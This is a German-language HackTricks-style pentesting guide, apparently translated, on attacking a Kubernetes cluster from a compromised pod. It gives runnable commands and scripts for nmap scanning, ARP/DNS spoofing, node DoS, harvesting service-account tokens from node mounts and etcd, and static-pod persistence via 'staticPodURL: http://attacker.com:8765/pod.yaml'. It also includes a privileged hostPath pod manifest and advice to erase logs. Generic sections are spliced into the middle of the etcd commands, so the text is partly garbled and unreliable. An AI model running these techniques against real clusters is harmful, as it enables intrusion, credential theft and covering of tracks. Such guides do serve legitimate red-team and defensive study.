# Angriff auf Kubernetes von innerhalb eines Pods

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## **Pod-Ausbruch**

**Wenn Sie Gl√ºck haben, k√∂nnten Sie m√∂glicherweise daraus entkommen und zum Knoten gelangen:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Ausbruch aus dem Pod

Um zu versuchen, aus dem Pod zu entkommen, m√ºssen Sie m√∂glicherweise zuerst **Berechtigungen eskalieren**, einige Techniken dazu:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Sie k√∂nnen diese **Docker-Ausbr√ºche √ºberpr√ºfen, um zu versuchen zu entkommen** aus einem Pod, den Sie kompromittiert haben:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Ausnutzen von Kubernetes-Berechtigungen

Wie im Abschnitt √ºber **Kubernetes-Enumeration** erkl√§rt:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Normalerweise werden die Pods mit einem **Service Account-Token** darin ausgef√ºhrt. Dieser Service-Account kann einige **Berechtigungen haben**, die Sie m√∂glicherweise **ausnutzen** k√∂nnen, um zu anderen Pods zu **wechseln** oder sogar zu den Knoten zu **entkommen**, die im Cluster konfiguriert sind. √úberpr√ºfen Sie, wie das funktioniert unter:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Ausnutzen von Cloud-Berechtigungen

Wenn der Pod in einer **Cloud-Umgebung** ausgef√ºhrt wird, k√∂nnten Sie m√∂glicherweise ein **Token vom Metadaten-Endpunkt leaken** und Berechtigungen damit eskalieren.

## Suche nach anf√§lligen Netzwerkdiensten

Da Sie sich in der Kubernetes-Umgebung befinden, sollten Sie, wenn Sie die Berechtigungen der aktuellen Pods nicht missbrauchen k√∂nnen und nicht aus dem Container entkommen k√∂nnen, nach potenziell anf√§lligen Diensten suchen.

### Dienste

**Zu diesem Zweck k√∂nnen Sie versuchen, alle Dienste der Kubernetes-Umgebung zu erhalten:**
```
kubectl get svc --all-namespaces
```
Standardm√§√üig verwendet Kubernetes ein flaches Netzwerkschema, was bedeutet, dass **jedes Pod/Service innerhalb des Clusters miteinander kommunizieren kann**. Die **Namespaces** innerhalb des Clusters **haben standardm√§√üig keine Netzwerksicherheitsbeschr√§nkungen**. Jeder im Namespace kann mit anderen Namespaces kommunizieren.

### Scannen

Das folgende Bash-Skript (entnommen aus einem [Kubernetes-Workshop](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) installiert und scannt die IP-Bereiche des Kubernetes-Clusters:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Checken Sie die folgende Seite, um zu erfahren, wie Sie **Kubernetes-spezifische Dienste angreifen** k√∂nnen, um **andere Pods/die gesamte Umgebung zu kompromittieren**:

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### Sniffing

Falls der **kompromittierte Pod einen sensiblen Dienst ausf√ºhrt**, bei dem andere Pods sich authentifizieren m√ºssen, k√∂nnten Sie in der Lage sein, die von anderen Pods gesendeten Anmeldeinformationen durch **Abh√∂ren lokaler Kommunikation** zu erhalten.

## Netzwerk-Spoofing

Standardm√§√üig funktionieren Techniken wie **ARP-Spoofing** (und dank dessen **DNS-Spoofing**) im Kubernetes-Netzwerk. Dann k√∂nnen Sie innerhalb eines Pods, wenn Sie die **NET\_RAW-F√§higkeit** haben (die standardm√§√üig vorhanden ist), benutzerdefinierte Netzwerkpakete senden und **MitM-Angriffe √ºber ARP-Spoofing auf alle Pods durchf√ºhren, die auf demselben Knoten ausgef√ºhrt werden.**\
Dar√ºber hinaus, wenn der **b√∂sartige Pod** auf dem **gleichen Knoten wie der DNS-Server** l√§uft, k√∂nnen Sie einen **DNS-Spoofing-Angriff auf alle Pods im Cluster** durchf√ºhren.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

In den Kubernetes-Manifesten gibt es keine Spezifikation von Ressourcen und **keine angewendeten Grenzen f√ºr die Container.** Als Angreifer k√∂nnen wir **alle Ressourcen verbrauchen, auf denen der Pod/Deployment l√§uft,** und andere Ressourcen verhungern lassen und eine DoS f√ºr die Umgebung verursachen.

Dies kann mit einem Tool wie [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng) durchgef√ºhrt werden:
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Du kannst den Unterschied sehen, w√§hrend `stress-ng` l√§uft und danach.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Node Nachexploitation

Wenn es Ihnen gelungen ist, **aus dem Container auszubrechen**, finden Sie im Node einige interessante Dinge:

- Der **Container-Runtime**-Prozess (Docker)
- Weitere **Pods/Container**, die auf dem Node ausgef√ºhrt werden und die Sie missbrauchen k√∂nnen (mehr Tokens)
- Das gesamte **Dateisystem** und das **Betriebssystem** im Allgemeinen
- Der **Kube-Proxy**-Dienst lauscht
- Der **Kubelet**-Dienst lauscht. √úberpr√ºfen Sie die Konfigurationsdateien:
  - Verzeichnis: `/var/lib/kubelet/`
  - `/var/lib/kubelet/kubeconfig`
  - `/var/lib/kubelet/kubelet.conf`
  - `/var/lib/kubelet/config.yaml`
  - `/var/lib/kubelet/kubeadm-flags.env`
  - `/etc/kubernetes/kubelet-kubeconfig`
- Andere **√ºbliche Kubernetes-Dateien**:
  - `$HOME/.kube/config` - **Benutzerkonfiguration**
  - `/etc/kubernetes/kubelet.conf`- **Regul√§re Konfiguration**
  - `/etc/kubernetes/bootstrap-kubelet.conf` - **Bootstrap-Konfiguration**
  - `/etc/kubernetes/manifests/etcd.yaml` - **etcd-Konfiguration**
  - `/etc/kubernetes/pki` - **Kubernetes-Schl√ºssel**

### Node kubeconfig finden

Wenn Sie die kubeconfig-Datei nicht in einem der zuvor kommentierten Pfade finden k√∂nnen, **√ºberpr√ºfen Sie das Argument `--kubeconfig` des Kubelet-Prozesses**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Geheimnisse stehlen
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Das Skript [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) wird automatisch **die Tokens anderer Pods abrufen und √ºberpr√ºfen, ob sie die Berechtigung haben**, nach der Sie suchen (anstatt dass Sie jeden einzelnen √ºberpr√ºfen m√ºssen):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Privileged DaemonSets

Ein DaemonSet ist ein **Pod**, der in **allen Knoten des Clusters ausgef√ºhrt wird**. Wenn also ein DaemonSet mit einem **privilegierten Servicekonto konfiguriert ist**, k√∂nnen Sie in **ALLEN Knoten** das **Token dieses privilegierten Servicekontos finden**, das Sie missbrauchen k√∂nnten.

Der Exploit ist derselbe wie im vorherigen Abschnitt, aber jetzt sind Sie nicht mehr vom Gl√ºck abh√§ngig.

### Pivot zu Cloud

Wenn der Cluster von einem Cloud-Dienst verwaltet wird, hat der **Knoten in der Regel einen anderen Zugriff auf das Metadaten-Endpunkt** als der Pod. Versuchen Sie daher, auf den Metadaten-Endpunkt vom Knoten aus zuzugreifen (oder von einem Pod mit hostNetwork auf True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Steal etcd

Wenn Sie den [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) des Knotens angeben k√∂nnen, auf dem der Container ausgef√ºhrt wird, erhalten Sie eine Shell innerhalb eines Steuerungsebenenknotens und erhalten die **etcd-Datenbank**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane-Knoten haben die **Rolle Master** und in **cloud-managed Clustern k√∂nnen Sie darin nichts ausf√ºhren**.

#### Secrets aus etcd lesen

Wenn Sie Ihren Pod auf einem control-plane-Knoten mit dem `nodeName`-Selektor im Pod-Spezifikation ausf√ºhren k√∂nnen, haben Sie m√∂glicherweise einfachen Zugriff auf die `etcd`-Datenbank, die alle Konfigurationen f√ºr den Cluster enth√§lt, einschlie√ülich aller Secrets.

Nachfolgend finden Sie eine schnelle und einfache M√∂glichkeit, Secrets aus `etcd` abzurufen, wenn es auf dem control-plane-Knoten l√§uft, auf dem Sie sich befinden. Wenn Sie eine elegantere L√∂sung w√ºnschen, die einen Pod mit dem `etcd`-Client-Dienstprogramm `etcdctl` startet und die Anmeldeinformationen des control-plane-Knotens verwendet, um eine Verbindung zu `etcd` herzustellen, egal wo es ausgef√ºhrt wird, werfen Sie einen Blick auf [dieses Beispielmanifest](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) von @mauilion.

**√úberpr√ºfen Sie, ob `etcd` auf dem control-plane-Knoten ausgef√ºhrt wird, und sehen Sie, wo sich die Datenbank befindet (Dies ist auf einem mit `kubeadm` erstellten Cluster)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
# Angriff auf Kubernetes von innerhalb eines Pods

In diesem Szenario gehen wir davon aus, dass wir bereits Zugriff auf einen Pod innerhalb eines Kubernetes-Clusters haben und untersuchen, wie wir von dort aus weiter in das Cluster eindringen k√∂nnen.

## 1. Erkunden der Umgebung

F√ºhren Sie die folgenden Befehle aus, um mehr √ºber die Kubernetes-Umgebung zu erfahren:

```bash
kubectl get pods
kubectl get services
kubectl get deployments
kubectl get nodes
```

## 2. Zugriff auf die Kubernetes-API

Versuchen Sie, auf die Kubernetes-API zuzugreifen, indem Sie die Service-Token oder Zertifikate im Pod verwenden.

## 3. Ausnutzen von Berechtigungen

√úberpr√ºfen Sie die Berechtigungen des Service-Accounts des Pods und versuchen Sie, diese auszunutzen, um auf Ressourcen im Cluster zuzugreifen.

## 4. Erkunden von weiteren Angriffsm√∂glichkeiten

Suchen Sie nach weiteren Schwachstellen oder Angriffspunkten innerhalb des Clusters, die Ihnen helfen k√∂nnten, Ihre Rechte zu erweitern oder auf sensible Daten zuzugreifen.
```bash
data-dir=/var/lib/etcd
```
**Zeigen Sie die Daten in der etcd-Datenbank an:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Extrahiere die Tokens aus der Datenbank und zeige den Namen des Service-Accounts an**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**Derselbe Befehl, aber mit einigen Greps, um nur das Standard-Token im kube-system-Namespace zur√ºckzugeben**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
# Angriff auf Kubernetes von innerhalb eines Pods

In diesem Szenario gehen wir davon aus, dass wir bereits Zugriff auf einen Pod innerhalb eines Kubernetes-Clusters haben und untersuchen, wie wir weiter vorgehen k√∂nnen, um das Cluster zu kompromittieren.

## 1. Erkundung der Umgebung

### 1.1. Ermitteln des Service-Accounts

F√ºhren Sie den Befehl `kubectl get sa` aus, um die Service-Accounts im Cluster anzuzeigen. √úberpr√ºfen Sie, ob der Service-Account des aktuellen Pods √ºber weitreichende Berechtigungen verf√ºgt.

### 1.2. √úberpr√ºfen der Berechtigungen

F√ºhren Sie den Befehl `kubectl auth can-i '*' '*'` aus, um zu √ºberpr√ºfen, ob der Service-Account des Pods auf alle Ressourcen im Cluster zugreifen kann.

## 2. Eskalation der Berechtigungen

### 2.1. Erstellen einer ClusterRoleBinding

Erstellen Sie eine ClusterRoleBinding, um dem Service-Account des Pods weitreichendere Berechtigungen im Cluster zu geben.

```bash
kubectl create clusterrolebinding privileged-role --clusterrole=cluster-admin --serviceaccount=default:<service-account>
```

### 2.2. Ausnutzen von Schwachstellen

Suchen Sie nach bekannten Schwachstellen in der Kubernetes-Version des Clusters und versuchen Sie, diese auszunutzen, um die Berechtigungen zu eskalieren.

## 3. Laterale Bewegung im Cluster

### 3.1. Erkunden Sie andere Pods

Nutzen Sie die erweiterten Berechtigungen, um auf andere Pods im Cluster zuzugreifen und Informationen zu sammeln.

### 3.2. Ausf√ºhren von Angriffen

Versuchen Sie, Angriffe wie Denial-of-Service (DoS) oder das Ausf√ºhren von Schadcode auf anderen Pods im Cluster durchzuf√ºhren.

## 4. Abdeckung der Spuren

Stellen Sie sicher, dass Sie Ihre Spuren verwischen, indem Sie Protokolle l√∂schen, zur√ºckbleibende Dateien entfernen und alle √Ñnderungen r√ºckg√§ngig machen, die Sie w√§hrend des Angriffs vorgenommen haben.

Durch das Verst√§ndnis dieser Angriffstechniken k√∂nnen Sie die Sicherheit Ihres Kubernetes-Clusters verbessern und potenzielle Schwachstellen proaktiv erkennen und beheben.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Statische/gespiegelte Pods Persistenz

_Statische Pods_ werden direkt vom kubelet-Daemon auf einem bestimmten Knoten verwaltet, ohne dass der API-Server sie beobachtet. Im Gegensatz zu Pods, die vom Steuerungsebene verwaltet werden (zum Beispiel, ein Deployment); stattdessen **√ºberwacht das kubelet jeden statischen Pod** (und startet ihn neu, wenn er fehlschl√§gt).

Daher sind statische Pods immer **an ein Kubelet** auf einem bestimmten Knoten gebunden.

Das **kubelet versucht automatisch, f√ºr jeden statischen Pod einen Spiegel-Pod auf dem Kubernetes-API-Server zu erstellen**. Dies bedeutet, dass die auf einem Knoten ausgef√ºhrten Pods auf dem API-Server sichtbar sind, aber nicht von dort aus gesteuert werden k√∂nnen. Die Pod-Namen werden mit dem Knoten-Hostname mit einem f√ºhrenden Bindestrich versehen.

{% hint style="danger" %}
Die **`spec` eines statischen Pods kann nicht auf andere API-Objekte verweisen** (z. B. ServiceAccount, ConfigMap, Secret, usw. Daher **k√∂nnen Sie dieses Verhalten nicht missbrauchen, um einen Pod mit einem beliebigen ServiceAccount** im aktuellen Knoten zu starten, um den Cluster zu kompromittieren. Aber Sie k√∂nnten dies verwenden, um Pods in verschiedenen Namespaces auszuf√ºhren (falls das aus irgendeinem Grund n√ºtzlich ist).
{% endhint %}

Wenn Sie sich im Knotenhost befinden, k√∂nnen Sie ihn dazu bringen, einen **statischen Pod innerhalb sich selbst zu erstellen**. Dies ist ziemlich n√ºtzlich, da es Ihnen m√∂glicherweise erm√∂glicht, einen Pod in einem anderen Namespace wie **kube-system** zu erstellen.

Um einen statischen Pod zu erstellen, sind die [**Dokumente eine gro√üe Hilfe**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Sie ben√∂tigen im Grunde genommen 2 Dinge:

* Konfigurieren Sie den Parameter **`--pod-manifest-path=/etc/kubernetes/manifests`** im **kubelet-Dienst** oder in der **kubelet-Konfiguration** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) und starten Sie den Dienst neu
* Erstellen Sie die Definition im **Pod-Definition** in **`/etc/kubernetes/manifests`**

**Ein weiterer unauff√§lligerer Weg w√§re:**

* √Ñndern Sie den Parameter **`staticPodURL`** in der **kubelet**-Konfigurationsdatei und setzen Sie etwas wie `staticPodURL: http://attacker.com:8765/pod.yaml`. Dadurch wird der kubelet-Prozess einen **statischen Pod erstellen, der die Konfiguration von der angegebenen URL** abruft.

**Beispiel** einer **Pod**-Konfiguration zur Erstellung eines privilegierten Pods in **kube-system** entnommen von [**hier**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### L√∂schen von Pods + nicht planbare Knoten

Wenn ein Angreifer einen **Knoten kompromittiert** hat und er **Pods von anderen Knoten l√∂schen** und **andere Knoten daran hindern kann, Pods auszuf√ºhren**, werden die Pods auf dem kompromittierten Knoten erneut ausgef√ºhrt und er wird in der Lage sein, **die Tokens zu stehlen**, die in ihnen ausgef√ºhrt werden.\
F√ºr [**weitere Informationen folgen Sie diesen Links**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Automatische Tools

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.

</details>
